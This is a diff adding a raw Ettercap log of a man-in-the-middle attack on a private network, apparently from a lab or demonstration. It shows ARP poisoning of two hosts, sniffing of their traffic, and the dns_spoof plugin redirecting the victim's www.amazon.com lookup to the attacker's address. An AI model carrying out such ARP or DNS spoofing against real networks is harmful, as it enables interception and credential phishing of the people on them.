@@ -1,0 +1,57 @@
+Access detected to www.amazon.com: Spoofing successful.
+Spoofed to IP: 192.168.91.243
+
+Ettercap Output:
+
+[1mettercap 0.8.3.1[0m copyright 2001-2020 Ettercap Development Team
+
+Listening on:
+wlan0 -> 74:FE:CE:96:1B:02
+192.168.91.243/255.255.255.0
+fe80::4626:de42:c0a0:a879/64
+2401:4900:82a1:432e:7ec1:b9da:ea6a:ab68/64
+
+Privileges dropped to EUID 0 EGID 0...
+
+34 plugins
+42 protocol dissectors
+57 ports monitored
+28230 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+GROUP 1 : 192.168.91.164 10:3F:44:EC:A2:83
+
+GROUP 2 : 192.168.91.37 CA:E6:6B:31:9C:E1
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+Activating dns_spoof plugin...
+
+
+
+Fri Nov  8 20:28:17 2024 [539108]
+192.168.91.164:0 --> 192.168.91.37:0 |  (0)
+
+
+Fri Nov  8 20:28:18 2024 [351582]
+TCP  192.168.91.164:58758 --> 142.250.194.227:80 | S (0)
+
+
+Fri Nov  8 20:28:18 2024 [640458]
+UDP  192.168.91.164:13120 --> 8.8.8.8:53 |  (37)
+:............accounts.google.com.....
+
+Fri Nov  8 20:28:18 2024 [737328]
+UDP  192.168.91.164:57441 --> 8.8.8.8:53 |  (32)
+.............www.amazon.com.....dns_spoof: A [www.amazon.com] spoofed to [192.168.91.243] TTL [3600 s]
